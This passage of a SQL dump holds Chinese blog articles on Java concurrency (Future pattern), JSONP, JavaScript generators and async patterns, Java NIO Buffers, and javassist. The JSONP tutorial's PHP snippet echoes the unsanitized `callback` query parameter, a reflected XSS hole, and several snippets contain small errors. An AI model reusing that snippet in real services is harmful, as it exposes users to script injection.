log.info(\"主线程干其他事\");\n        Thread.sleep(1000);\n        // 在此阻塞,直到等到futureTask返回值为止\n        String result = futureTask.get();\n        log.info(\"result:{}\",result);\n    }\n} \n```\n1. 完成了类似于前端ajax相同的事\n2. 子线程可能需要耗费时间获取结果,此时主线程没有阻塞而是去干其他事\n3. 主线程需要结果时则会等待子线程\n\n#### Callable与Runnable区别\n1. Callable的call可以有返回值,Runnable没有返回值\n2. 线程池API的submit与execute的区别也是如此\n\n### 手写Future模式\n##### Java可以依靠多线程通讯的notify与wait或AQS来实现future模式\n\n#### 主Main\n```java\n/**\n * 实现future\n * 类似callable和ajax效果\n * @author tuwq\n */\npublic class Main {\n	public static void main(String[] args) {\n		FutureClient futureClient = new FutureClient();\n		Data request = futureClient.request(\"1\");// // 发送请求\n		System.out.println(\"主线程干其他事\");\n		String result = request.getRequest();// 等待返回结果\n		System.out.println(\"获取结果:\" + result);\n	}\n}\n```\n#### 模拟获取数据RealData \n```java\n/**\n * 模拟获取真实数据\n * @author tuwq\n */\npublic class RealData extends Data {\n\n	private String resultResult;\n	\n	/**\n	 * new RealData()时等待3秒后resultResult就有值了\n	 * @param requestData\n	 */\n	public RealData(String requestData) {\n		System.out.println(\"网络请求开始:参数=\" + requestData);\n		try {\n			Thread.sleep(3000);\n		} catch (Exception e) {\n		}\n		System.out.println(\"操作执行完毕...\");\n		// 业务返回结果\n		this.resultResult = \"data\";\n	}\n	\n	@Override\n	public String getRequestResult() {\n		return resultResult;\n	}\n\n}\n```\n#### 发送请求的客户端FutureClient\n```java\n/***\n * 发送请求的客户端\n * @author tuwq\n */\npublic class FutureClient {\n	\n	public Data request(String requestData) {\n		FutureData futureData = new FutureData();\n		new Thread(new Runnable() {\n			@Override\n			public void run() {\n				// 获取RealData会进行阻塞,需要等待3秒\n				RealData realData = new RealData(requestData);\n				// 得到结果后设置放入结果对象\n				futureData.setRedData(realData);\n			}\n		}).start();;\n		return futureData;\n	}\n}\n```\n#### 数据结果集(核心),FutureData\n```java\n/**\n * 当有线程想要获取RealData的时候,程序会被阻塞\n * 等到RealData被注入才会使用getReal()方法\n * @author tuwq\n */\npublic class FutureData extends Data {\n\n	// 读取结果\n	private boolean FLAG = false;\n	private RealData realData;\n	\n	/**\n	 * 写值\n	 * 已经有结果-返回\n	 * 还没有结果-设置值\n	 */\n	public synchronized void setRedData(RealData realData) {\n		if (FLAG) {\n			return;\n		}\n		this.realData = realData;\n		FLAG = true;\n		this.notify();\n	}\n	\n	/**\n	 * 读值\n	 * 没有结果-等待\n	 * 有结果-去获取结果\n	 */\n	@Override\n	public synchronized String getRequestResult() {\n		try {\n			while(!FLAG) {\n				this.wait();\n			}\n		} catch (Exception e) {\n		}\n		return realData.getRequestResult();\n	}\n\n}\n``` \n#### wait,notify\n1. wait: 让线程等待,但是它会释放锁的资源\n2. notify: 唤醒当前对象锁池中被等待线程\n\n依靠notify和wait即可完成Future模式,运行效果如ajax一样\n\n# 总结\n1. Future模式不是什么高大上的东西,经常被使用\n2. *它的核心是去除主函数的等待时间,并使得原本需要等待的时间段可以用于处理其他业务逻辑*\n3. 把它当成ajax即可', 2, 0, 76, 0, 0, '2018-08-10 16:51:18', '2019-04-13 23:36:58', 0, 0);
INSERT INTO `article` VALUES (5, 1, '两分钟理解一下jsonp', '2018/8/1533891460_b27b6d44040e236e500b48720d696008.jpg', '## JSONP是什么\njsonp是一种利用函数回调的形式实现的一种跨域方式\n先看看简单的例子\n```html\n<!-- html 标签的src属性 是支持跨域的 -->\n<img src=\"https://ali/taobao.jpg\" />\n<!-- jsonp就是利用这个特性来实现的跨域，用的是script标签 -->\n<script src=\"https://192.168.1.1/js/myData.js\"></script>\n```\n我们用js+php做一个简单的例子\n```javascript\n<script>\n	// 写一个回调函数\n	function eatFood(foodName) {\n 		console.log(\"我爱吃\"+foodName)\n	}	\n<script>\n<!-- 使用script标签发送一个get请求去到了一个php文件 -->\n<script src=\"https://86.56.449.45/php/jsonp.php?callback=eatFood\"></script>\n```\n注意上面callback=eatFood,这告诉了服务端回调时要调用哪个函数  \n然后来写这个jsonp.php文件\n```php\n<?php\n	// 接收callback这个参数，并调用这个方法返回\n	echo $_GET[callback].\'(\"火锅\")\'\n?>\n```\n此时eatFood方法应该会被调用并打印我爱吃火锅  \n## 使用JQuery\n难道我们每次jsonp请求都要搞个script标签然后写服务端接口地址?  \njQuery已经帮我们把jsonp封装好了，下面来看看jQuery如何调用jsonp\n```javascript\n$.ajax({\n	url: \'86.56.49.45/jsonp.php\',\n	success(data) {\n		console.log(data)	\n	},\n	dataType:\'jsonp\',\n	// 如果你想指定其他回调方法而不是jquery的success方法，可以使用jsonCallback指定回调函数\n	// jsonCallback: \'myCallbakc\'\n})\n```\njsonp.php文件中\n```php\n<?php\n	// 接收参数并执行返回\n	echo $_GET[\'callback\'].\"(\'yes\')\";\n?>\n```\n此时success方法中应该会打印yes  \n这就是jsonp的原理,注意jsonp只能get请求，无法post,*因为script标签只能get请求*', 2, 2, 69, 0, 0, '2018-08-10 17:34:44', '2019-02-22 00:05:02', 0, 0);
INSERT INTO `article` VALUES (6, 1, '理解generator生成器函数', '2018/8/1533901545_4e9baa94c630dc8cc899fcb189319580.jpg', '# 前言\ngenerator生成器函数是es6中一个解决回调函数嵌套的特性，本文不深入理解特性实现   \n## 快速了解\n```javascript\nfunction *fm(arr) {\n	for (let i = 0; i< arr.length; i++) {\n		yield arr[i]\n	}\n}\nconst gen = fm([\'S\',\'A\',\'B\'])\nconsole.log(gen.next().value)// S\nconsole.log(gen.next().value)// A\nconsole.log(gen.next().value)// B\nconsole.log(gen.next().done)// true\n```\n上面的代码可能没有看懂,我们来详解\n```javascript\n// 我们把一个数字数组给了这个生成器函数\nconst gen = fm([\'S\',\'A\',\'B\'])\n// 然后我们调用next得到一个S，也就是我们第一个的值\nconsole.log(gen.next().value)\n// 然后我们继续调用next得到下一个值A\nconsole.log(gen.next().value)\n// 打印得到一个false,这说明这里面还有一个值B,如果没有值则会打印true\n// 我们可以根据done这个来判断里面还有没有值\nconsole.log(gen.next().done)\n```\n可能上面还是看不懂或者并不知道这有什么用，让我们继续一个简单的例子\n## 简单例子 \n```javascript\n// 这个*说明这是一个generator生成器函数，你可以在里面用yeild这个关键字\nfunction *d() {\n	yield \'S\'\n	yield \'A\'\n	yield \'C\'\n}\nconst dn = d()\nconsole.log(dn.next().value) // S\nconsole.log(dn.next().value) // A\nconsole.log(dn.next().value) // C\n```\n### 硬编码调用\n你有没有发现什么，那个yeild关键字像不像是暂停键  \n1. 我第一次yeild,它就走到了yield \'S\'，然后得到右边的值也就是S,然后它就停在那里了，等我调用下一次next()\n2. 你可能会觉得这没有意义这里的S,A,C都是放好了的,还是没什么用\n\n### 赋值调用\n那么我们能不能手动扔值进去，当然可以\n```javascript\nfunction *f() {\n	var result = yield\n	result()\n}\nlet fn = f()\nfn.next() // 什么事都没有发生,value值是undefined,done是false\nfn.next(function(){ \n	// 这里被执行了\n	console.log(\'callback\')\n})\n```\n1. 当第一次调用next时，yield的右边是没有任何值的,但yeild并没有结束,它在等待新的next结束它这次yield,所以done是false\n2. 当第二次调用next时,yield被唤醒了,它右边的值就是我们next()时传进去的回调函数,所以result得到了我们传进去的回调函数,随后它调用这个回调函数，于是打印了callback \n\n看到了这里你可能还是无法实际使用它,我们来一个实际的例子 \n## 实际例子\n```javascript\nrun(function *(){\n	// axios是一个http请求的模块,返回的是一个promise\n	const res = yield axios.get(\'https://182.56.12.333/api/g\')\n	const data = yield res.data\n	console.log(data)// 返回结果 \n})\nfunction run(generator) {\n	const gn = generator()\n	const promise = gn.next().value // 第一个next传入参数没有意义\n	promise.then((res)=>{\n		let data = gn.next(res).value\n		console.log(gn.next(data).done)// true\n	})\n} \n```\n上面的例子可能有点绕，如果可以看懂,说明对generator生成器函数有一个大致的理解', 0, 0, 81, 0, 0, '2018-08-10 19:45:51', '2019-02-22 00:05:30', 0, 0);
INSERT INTO `article` VALUES (7, 1, 'js回调函数的各时期的替换方案', '2018/8/1533906679_209ca2fe2b07174d0ea9a6f928bc3aa7.jpg', '#  前言\nJs的回调函数嵌套是一直以来的诟病,在复杂的nodeJs处理逻辑时，往往回调函数像搭楼层那么高，一望天际  \n为了解决这个问题，出现了许多的新方法来取代回调函数\n## 传统回调函数\n我们当然要从最开始的回调函数开始啦\n```javascript\n	function fn(data,callback) {\n		let result = data + 1\n		callback(result)\n	}\n	function mh(data,callback) {\n		let result = data * 9\n		callback(result)\n	}\n	fn(1,(result)=>{\n		console.log(result)\n	})	\n```\n这是最简单的回调函数形式，学过js的都能看懂\n但当我们需要嵌套时就要命了\n```javascript\nfn(1,(result)=>{\n	mh(result,(result)=>{\n		fn(result,(result)=>{\n			mh(result,(result)=>{\n				console.log(result)\n			})		\n		})\n	})\n})\n```\n可以看到随着嵌套的形式变多，代码样子开始往奇怪的方向发展了,\n因为这个问题出现了新的替代回调函数的方式\n## Promise\npromise是现在非常常用的方式，许多的框架和模块采用promise来取代回调函数嵌套的问题  \n先来一个简单的例子\n```javascript\nfunction fn(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data + 1 \n		resolve(result)	\n	}\n}\nfunction mh(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data * 9\n		resolve(result)\n	})\n}\nfn(1).then((result)=>{\n	console.log(result)\n}).catch((result)=>{\n	console.log(result)\n})\n```\n相比于传统回调,promise的回调结果在then方法中获取，如果调用reject则可以在catch方法中获取  \n现在来看看promise在嵌套的情况下 \n```javascript\nfn(1).then((result)=>{\n	return mh(result)\n}).then((result)=>{\n	return fn(result)\n}).then((result)=>{\n	return mh(result)\n}).then((result)=>{\n	console.log(result)\n}).catch((result)=>{ \n	console.log(result)\n})\n```\n可以看到Promise这种嵌套的代码样子比传统的回调函数要好看不少，最后的catch中可以进行统一处理被reject调用的结果,也可以在每个then中各追加一个catch处理\n## co+generator+Promise\nco模块是一个非常强大的模块，使用异步的回调调用像同步代码一样的写法,解决了嵌套的麻烦   \n我们直接上例子 \n```javascript\nconst co = require(\'co\')\nfunction fn(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data + 1\n		resolve(result)\n	})\n}\nfunction mh(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data * 9\n		resolve(result)\n	})\n}\nco(function *(){\n	var result = yield fn(1)\n	result = yield mh(result)\n	result = yield fn(result)\n	result = yield mh(result)\n	console.log(result)\n}).catch((result)=>{\n	console.log(result)\n})\n```\n可以看到co模块使得异步回调的代码变得像同步代码一样编写，非常的强大   \n如果你对上面的generator函数不了解你可以搜索我的另一篇文章*理解generator生成器函数*\n## es7中的async+await\nasync异步函数是一个非常强大的特性,nodeJs的框架*koa2*就是采用的这种特性而开发的 \n我们首先举个简单例子 \n```javascript\nasync function afn(data) {\n	let result = data + 1\n	return result \n}\nafn(1).then((result)=>{\n	console.log(result)\n})\n```\n可以看到异步函数返回时一个promise,我们应该在then中取结果而不是直接执行获得返回值  \n下面看看es7的异步函数是如何解决异步嵌套调用问题的\n```javascript\nfunction fn(data) {\n	let result = data + 1\n	return result\n}\nfunction mh(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data * 9\n		resolve(result)\n	})\n} \nasync function afn(data) {\n	let result = data * 50\n	return Promise.resolve(result)\n}\nasync function handler() {\n	let result = await fn(1)\n	result = await mh(result) \n	result = await afn(result) \n	console.log(result)\n	return result\n}\nhander().then((result)=>{\n	console.log(result)\n}).catch((result)=>{\n	console.log(result)\n})\n```\n从上面代码可以看出es7的异步函数十分爽快,它的await关键字既可以等待普通函数的返回值也可以等待promise的返回值，而且它本身也是一个promise非常的灵活,注意只有异步函数才可以加await关键字', 0, 0, 65, 0, 1, '2018-08-10 21:11:27', '2019-02-22 00:05:53', 0, 0);
INSERT INTO `article` VALUES (8, 1, 'IO与NIO区别,Buffer概念解释', '2019/9/1567576574_D8D9E613575A503ABDDBAC8098B62205.jpg', '### IO\n#### 图示\n![iohanyi.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567576659_iohanyi.png)\n1. java.io中最为核心的一个概念是流(Stream),面向流的编程,Java中,一个流要么是输入流,要么是输出流,不可能同时既是输入流又是输出流\n2. 在io编程当中,stream本身它是一个流,数据从流当中读到我们程序当中的,我们读取的方式很简单,就是读取,读到一个字节就拿到一个字节,不断读取.这样数据就直接从stream当中读取到我们程序里面了\n\n#### 代码例子\n```java\npublic class IOWriteTest {\n    public static void main(String[] args) throws Exception {\n        FileOutputStream fileOutputStream = new FileOutputStream(\"IOTest.txt\");\n        fileOutputStream.write(\"hello world\".getBytes());\n        fileOutputStream.close();\n    }\n}\n\npublic class IOTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"IOTest.txt\");\n        int read = 0;\n        while(( read = fileInputStream.read())!=-1) {\n            char c = (char) read;\n            System.out.println(\"Character: \" +(char)c);\n        }\n        fileInputStream.close();\n    }\n}\n\npublic class IOCopyTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"IOCopyInput.txt\");\n        FileOutputStream fileOutputStream = new FileOutputStream(\"IOCopyOutput.txt\");\n\n        int read = 0;\n        while((read = fileInputStream.read())!=-1) {\n            fileOutputStream.write(read);\n        }\n        fileInputStream.close();\n        fileOutputStream.close();\n    }\n}\n```\n1. 这是常见的io读取与写入文件内容,但是由于是stream,读到字节就拿到一个字节不断读取,无法控制读写位置,写入亦然\n2. io当中,一个流不可能同时是输入流又是输出流\n\n### NIO\n#### 图示\n![niohanyi.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567576659_niohanyi.png)\n1. java.nio中拥有3个核心概念: Selector,Channel与Buffer,在java.nio中,我们是面向块(block)或是缓冲区(buffer)编程的,buffer本身就是一块内存,底层实现上,它实际上是个数组,数据的读,写都是通过buffer来实现的\n2. 在nio编程当中,是绝对不会出现io编程情况,在nio中,buffer是个极为重要的概念,读的数据来自于channel,这是一定要执行的一个步骤,\n就是将数据从channel读取到buffer当中,数据再从buffer读取到程序当中,绝对不可能出现的情况就是数据从channel直接读取到程序当中\n3. nio当中,一个channel把数据读到buffer当中,程序可以读取buffer中的数据,也可以把数据写回到buffer中这个读写状态就是通过方法来实现的,这个方法就是buffer.flip(),状态翻转\n4. 除了数组之外,buffer还提供了对于数据的结构化访问方式,并且可以追踪到系统的读写过程\n5. 读写过程指的是,读和写其实在底层都是通过相应的一些标识来判断当时读写位置,无论进行读写,系统都能自动定位你当前读写的位置在哪,以及翻转之后从哪读从哪写,可以读写到哪个地方\n\n#### 代码例子\n```java\npublic class NIOWriteTest {\n    public static void main(String[] args) throws Exception {\n        FileOutputStream fileOutputStream = new FileOutputStream(\"NIOTest.txt\");\n        FileChannel fileChannel = fileOutputStream.getChannel();\n\n        ByteBuffer byteBuffer = ByteBuffer.allocate(512);\n        byte[] messages = \"hello world\".getBytes();\n        for (int i = 0; i < messages.length; i++) {\n            byteBuffer.put(messages[i]);\n        }\n\n        byteBuffer.flip(); // 状态翻转\n\n        fileChannel.write(byteBuffer);\n\n        fileOutputStream.close();\n    }\n}\n\npublic class NIOReadTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"NIOTest.txt\");\n        FileChannel fileChannel = fileInputStream.getChannel();\n\n        ByteBuffer byteBuffer = ByteBuffer.allocate(512);\n        fileChannel.read(byteBuffer);\n\n        byteBuffer.flip();\n        // 有没有剩余的\n        while(byteBuffer.remaining() > 0) {\n            byte b = byteBuffer.get();\n            System.out.println(\"Character: \" +(char)b);\n        }\n        fileInputStream.close();\n    }\n}\n\npublic class NIOCopyTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"NIOCopyInput.txt\");\n        FileOutputStream fileOutputStream = new FileOutputStream(\"NIOCopyOutput.txt\");\n        FileChannel inputChannel = fileInputStream.getChannel();\n        FileChannel outputChannel = fileOutputStream.getChannel();\n\n        ByteBuffer buffer = ByteBuffer.allocate(512);\n        while(true) {\n            buffer.clear(); // 如果注释掉这行代码,将会导致buffer的内容没有清空一直读取\n            int read = inputChannel.read(buffer);\n            System.out.println(\"read: \" + read);\n            if (-1 == read) {\n                break;\n            }\n            buffer.flip();\n            outputChannel.write(buffer);\n        }\n        inputChannel.close();\n        outputChannel.close();\n    }\n}\n```\n1. channel指的是可以向其写入数据或是从中读取数据的对象,它类似于Java.io中的stream\n2. 所有数据的读写都是通过buffer来进行的,永远不会出现直接向channel写入数据的情况,或是直接从channel读取数据的情\n3. 与stream不同的是,channel是双向的,而一个流只可能是inputStream或是outputStream,channel打开后则可以进行读取,写入或是读写\n4. 由于channel是双向的,因此它能更好地反映出底层操作系统的真实情况,在linux系统中,底层操作系统的通道就是双向的\n\n### Buffer的重要属性,以下内容为jdk源码解释\n#### Buffer是什么\n1. 用于特定基元类型的数据的容器\n2. buffer缓冲区是特定元素的原始类型线性有限序列\n3. 一个buffer除了它的内容之外,buffer重要本质的属性是 position,limit与capacity\n4. 理解buffer的position,limit与capacity是非常非常重要的\n\n#### position,limit与capacity\n1. 一个buffer的capacity指的是它所包含的元素的个数,一个buffer的capacity永远不会是负数并且永远不会变化\n2. 一个buffer的limit指的是不能被读也不能被写的第一个元素索引,一个buffer的limit是永远不会是负数的并且永远不会超过capacity\n3. 一个buffer的position指的是下一个将要去读或者去写的元素索引,一个buffer的position是不可能是负数的并且永远不会超过limit\n\n#### mark与reset\n1. mark: 标记保存当前position位置,它不会超过position,如果mark被定义,但当position和limit被调整到小于mark的话,mark会被丢弃掉变为-1\n2. reset: 将position回到mark所标记保存的位置,如果mark未定义然后调用会造成InvalidMarkException\n\n#### 其他内容\n1. 新创建的buffer,position值是0,mark是未定义的,初始化limit可能是0,也可能是其他值,这个值依赖于buffer的类型以及相应的buffer构建方式\n2. 新创建buffer的每一个元素的每一个初始值为0 \n3. 数据可以通过channel传输到buffer或从buffer中传出,它总是相对于当前position\n4. 相对操作,读或是写一个或多个元素,从当前position位置开始,然后会增加position位置,增加所读写传递的元素的数量\n5. 它们的不变关系为以下情况:0 <= mark <= position <= limit <= capacity\n6. Java中的8种原生数据类型其中7种都有各自对应的buffer类型,如IntBuffer,LongBuffer,ByteBuffer及CharBuffer等等,并没有BooleanBuffer类型\n\n#### 相对操作与绝对操作\n1. 此类的每个子类定义了两个类别进行操作：\n2. *相对操作*: 读取或写入一个或多个元素开始在当前位置，然后按位数递增位置元素转移,如果请求的转移超过限制,则get操作抛出BufferUnderflowException.相对的,put操作抛出BufferOverflowException.当抛出异常时,在任何一种情况下，都不会传输数据\n3. *绝对操作*: 采用显式元素索引而不是元素位置,当如果index参数超过限制,那么get和put操作将会抛出IndexOutOfBoundsException\n\n### 代码示范了解三个重要属性\n#### 创建buffer并添加数据\n![positionlimitcapacity1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567576659_positionlimitcapacity1.png)\n```java\n        IntBuffer buffer = IntBuffer.allocate(10);\n        System.out.println(\"start capacity:\" + buffer.capacity());\n        System.out.println(\"start position: \" + buffer.position());\n        System.out.println(\"start limit: \" + buffer.limit());\n        for (int i = 0; i < 5; ++i) {\n            int randomNumber = new SecureRandom().nextInt(20);\n            buffer.put(randomNumber);\n            System.out.println(\"put data position: \" + buffer.position());\n        }\n        System.out.println(\"before flip limit:\" + buffer.limit());\n        System.out.println(\"no data value: \" + buffer.get(9));\n```\n\n#### 调用buffer.flip()进行状态翻转后\n![positionlimitcapacity2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567576659_positionlimitcapacity2.png)\n```java\n        buffer.flip();\n        System.out.println(\"after flip limit:\" + buffer.limit());\n        System.out.println(\"after flip position: \" + buffer.position());\n        System.out.println(\"enter while loop\");\n        // 有没有剩余的\n        while (buffer.hasRemaining()) {\n            System.out.println(\"position: \" + buffer.position());\n            System.out.println(\"limit: \" + buffer.limit());\n            System.out.println(\"capacity: \" + buffer.capacity());\n\n            System.out.println(buffer.get());\n        }\n```\n#### 总结一下\n1. IntBuffer.allocate(10): 分配缓冲区大小,也就是底层数组的大小\n2. capacity: 初始化为空间大小,永远不会发生变化\n3. position: 初始为0,指的是下一个将要去读或者去写的元素索引,当读或是写一个或多个元素,从当前position位置开始,然后会增加position位置,增加所读写传递的元素的数量\n4. limit: IntBuffer的limit初始为空间大小,初始化limit可能是0,也可能是其他值,这个值依赖于buffer的类型以及相应的buffer构建方式\n5. buffer.flip(): 状态翻转,它将会导致limit=position,position=0,mark=-1,在一系列通道读取或放置操作之后，调用此方法准备一系列通道写入或相对操作.此方法通常与java.nio.ByteBuffer＃compact compact方法从中传输数据一个地方到另一个地方\n\n### Buffer的重要方法\n1. clear：为一个新的序列准备一个缓冲区,它将会使position = 0;limit = capacity,mark = -1\n2. flip: 为一个新的序列准备一个缓冲区,它将会使limit = position,position = 0,mark = -1\n3. rewind: 倒带,它将会使position = 0,mark = -1\n\n### SliceBuffer\n```java\npublic static void main(String[] args) {\n        ByteBuffer buffer = ByteBuffer.allocate(10);\n        for (int i = 0; i < buffer.capacity(); i++) {\n            buffer.put((byte)i);\n        }\n        // 起始位置指向2,limit指向6\n        buffer.position(2);\n        buffer.limit(6);\n        // 不包含6\n        ByteBuffer sliceBuffer = buffer.slice();\n        for (int i = 0; i < sliceBuffer.capacity(); i++) {\n            byte b = sliceBuffer.get(i);\n            b *= 2;\n            sliceBuffer.put(i, b);\n        }\n	    // 恢复初始状态   \n        buffer.position(0);\n        buffer.limit(buffer.capacity());\n        while (buffer.hasRemaining()) {\n            System.out.println(buffer.get());\n        } \n}\n```\n1. SliceBuffer与原有buffer共享相同的底层数组\n2. buffer.slice(): 创建一个新的byteBuffer,其内容是一个原Buffer共享的子序列\n3. 这个新的buffer内容就会以原buffer的position作为起始位置,对这个buffer内容进行任何修改,对原buffer的任何修改都对新的buffer是可见的,反之亦然\n4. 两个buffer的position,limit,mark都是独立的\n\n### ReadOnlyBuffer\n```java\npublic class NioTest7 {\n    public static void main(String[] args) {\n        ByteBuffer buffer = ByteBuffer.allocate(10);\n        System.out.println(buffer.getClass());\n        for (int i = 0; i < buffer.capacity(); i++) {\n            buffer.put((byte)i);\n        }\n        ByteBuffer readOnlyBuffer = buffer.asReadOnlyBuffer(); // 只读buffer\n        System.out.println(readOnlyBuffer.getClass());\n        readOnlyBuffer.position(0);\n        // readOnlyBuffer.put((byte)2);\n    }\n}\n```\n1. 返回了一个HeapByteBufferR,Heap表示是堆,R表示只读\n2. 新buffer的内容就是原buffer的内容,对原buffer内容的改变,对新buffer也是可见的\n3. 新buffer本身是只读的,并且不允许共享内容的修改\n4. 两个buffer的position,limit,mark都是独立的\n\n### MappedByteBuffer\n```java\npublic static void main(String[] args) throws Exception {\n        RandomAccessFile randomAccessFile = new RandomAccessFile(\"NioTest.txt\", \"rw\");\n        FileChannel fileChannel = randomAccessFile.getChannel();\n        // 映射5个字节大小 将内存文件映射到内存当中\n        MappedByteBuffer mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_WRITE, 0, 5);\n        mappedByteBuffer.put(0, (byte)\'a\');\n        mappedByteBuffer.put(3, (byte)\'b\');\n        randomAccessFile.close();\n}\n```\n1. appedByteBuffer内存映射文件是一种允许Java程序直接从内存访问的一种特殊文件,我们可以将整个文件或者说整个文件的一部分映射到内存当中\n2. 那么接下来由操作系统来负责相关的页面请求,并且将内存修改写入到文件当中,我们的应用程序只需要处理内存的数据,这样可以实现非常迅速的io操作,因为内存映射文件的内存本身是在Java的堆外内存\n\n### FileLock\n```java\npublic static void main(String[] args) throws Exception {\n        RandomAccessFile randomAccessFile = new RandomAccessFile(\"NioTest.txt\", \"rw\");\n        FileChannel fileChannel = randomAccessFile.getChannel();\n\n        FileLock fileLock = fileChannel.lock(3, 6, true);// 获取此通道文件的给定区域的锁定,锁定区域开始结束,是否共享\n        System.out.println(\"valid: \" + fileLock.isValid()); // 锁是否有效\n        System.out.println(\"lock type: \" + fileLock.isShared()); // 锁是否共享\n\n        fileLock.release();// 释放锁\n        randomAccessFile.close();\n}\n```\n1. 获取此channel文件的给定区域的锁定\n2. 以先到者为准,此方法的调用将阻塞，直到该channel可以已锁定，此channel已关闭，或调用的线程被中断。\n3. 如果在调用期间该通道被另一个线程关闭此方法将抛出AsynchronousCloseException \n4. 共享锁【S锁】: 又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。\n5. 排他锁【X锁】: 又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。\n\n### Scattering与Gathering\n```java\npublic static void main(String[] args) throws Exception {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        InetSocketAddress address = new InetSocketAddress(8899);\n        serverSocketChannel.socket().bind(address);\n\n        int messageLength = 2 + 3 + 4;\n\n        ByteBuffer[] buffers = new ByteBuffer[3];\n        buffers[0] = ByteBuffer.allocate(2);\n        buffers[1] = ByteBuffer.allocate(3);\n        buffers[2] = ByteBuffer.allocate(4);\n\n        SocketChannel socketChannel = serverSocketChannel.accept();\n        while(true) {\n            int bytesRead = 0;\n            while(bytesRead < messageLength) {\n                long r = socketChannel.read(buffers);\n                bytesRead += r;\n                System.out.println(\"byteRead:\" + bytesRead);\n                Arrays.asList(buffers).stream().map(buffer -> \"position: \" + buffer.position() + \", limit: \" + buffer.limit())\n                .forEach(System.out::println);\n            }\n\n            Arrays.asList(buffers).forEach(buffer -> {\n                buffer.flip();\n            });\n\n            long bytesWritten = 0;\n            while(bytesWritten < messageLength) {\n                long r = socketChannel.write(buffers);\n                bytesWritten += r;\n            }\n            Arrays.asList(buffers).forEach( buffer -> {\n                buffer.clear();\n            });\n            System.out.println(\"byteRead: \" + bytesRead + \", byteWritten:\" + bytesWritten + \", messageLength:\" + messageLength);\n        }\n}\n```\n#### Scattering\n1. buffer无论读写,都是把信息放置到我们所传递进去的byteBuffer当中,buffer只有一个\n2. Scattering分散: 我们在读的时间不仅可以传递一个buffer,我们还可以传递一个buffer的数组\n3. 举个例子,比如说我要从channel当中把信息读到buffer里面,那么channel里面有20个字节,我可以传递一个buffer数组,往数组里面去读信息(第一个buffer的capacity长度是10,第二个是5,第三个是5),它会将第一个buffer读满,依次读满三个buffer\n4. 把来自于一个channel当中的数据读到了多个buffer当中,它总是按照顺序,并且只有把第一个读满之后再去第二个,第二个读满读第三个\n5. 如果第一个没有读满是不会去读第二个的,这是scattering的含义\n\n#### Gathering\n1. Gathering合并: 与scattering反过来,我们在往外写的时候,也可以传递一个buffer的数组\n2. 它会将第一个buffer全部都写到外面,写到channel当中,然后写第二个,写三个,按照顺序来进行,这是gathering的含义\n\n#### 应用场景\n1. 关于sattering和gathering它们的用途场景\n2. 举个例子,我们自定义一个协议,将请求头,消息体分别读取到不同的buffer当中,天然的实现了数据的分门别类,不必是我只传递一个buffe,把请求头和消息体的信息都读到buffer,然后再去解析这个buffer,不必这样去做了', 3, 0, 131, 0, 0, '2018-08-11 08:59:38', '2019-09-15 20:11:33', 0, 0);
INSERT INTO `article` VALUES (9, 1, '操作字节码技术', '2018/8/1533962123_4263b004ee2929bd838d79feeb754b62.jpg', '## 字节码技术\n### 什么是字节码技术\n1. jvm底层执行的指令\n2. 对当前文件进行字节码操作,如lombok生成Set,Get就是依靠字节码技术来实现\n3. 可以完成如动态代理等设计思想的实现\n4. 可以操作字节码工具: asm,cglib,bcel,javassist\n\n### 如何操作字节码\n#### 创建字节码文件\n```java\n/**\n * 使用Java字节码技术创建字节码\n * @author tuwq\n */\npublic class Create {\n	/**\n	 * 创建类\n	 * 创建属性\n	 * 添加方法\n	 * 添加构造函数\n	 * 生成Class文件\n	 * @param args\n	 * @throws Exception \n	 */\n	public static void main(String[] args) throws Exception {\n		ClassPool pool = ClassPool.getDefault();\n		CtClass userClass = pool.makeClass(\"root.bytecode.User\");\n		CtField nameField = CtField.make(\"private String name;\", userClass);\n		CtField ageField = CtField.make(\"private Integer age;\", userClass);\n		userClass.addField(nameField);\n		userClass.addField(ageField);\n		\n		CtMethod getNameMethod = CtMethod.make(\"public String getName() {return name;}\", userClass);\n		userClass.addMethod(getNameMethod);\n		CtConstructor ctConstructor = new CtConstructor(new CtClass[] {pool.get(\"java.lang.String\"),pool.get(\"java.lang.Integer\")}, userClass);\n		ctConstructor.setBody(\"{ this.name = name;this.age = age; }\");\n		userClass.addConstructor(ctConstructor);\n		// F:/dirtest会出现User.class文件\n		userClass.writeFile(\"F:/dirtest\");\n	}\n} \n```\n#### 修改字节码文件\n```java\n/**\n * 动态修改字节码文件\n * @author tuwq\n */\npublic class Update {\n\n	/**\n	 * 获得字节码文件\n	 * 修改方法\n	 * 执行方法\n	 * @param args\n	 * @throws Exception\n	 */\n	public static void main(String[] args) throws Exception {\n		ClassPool pool = ClassPool.getDefault();\n		CtClass userClass = pool.get(\"root.bytecode.User\");\n		CtMethod method = new CtMethod(CtClass.voidType, \"sum\", new CtClass[] {CtClass.intType,CtClass.intType}, \n				userClass);\n		method.setBody(\"{System.out.println( $1 + $2 );}\");\n		userClass.addMethod(method);\n		userClass.writeFile(\"F:/dirtest\");\n		\n		Class clazz = userClass.toClass();\n		Object newInstance = clazz.newInstance();\n		Method sumMethod = clazz.getDeclaredMethod(\"sum\", int.class, int.class);\n		sumMethod.invoke(newInstance, 1, 1);\n	}\n	\n	private static void sum(int i, int j) {\n		System.out.println( i + j );\n	}\n}\n```', 1, 0, 76, 0, 0, '2018-08-11 12:24:50', '2019-10-16 20:33:00', 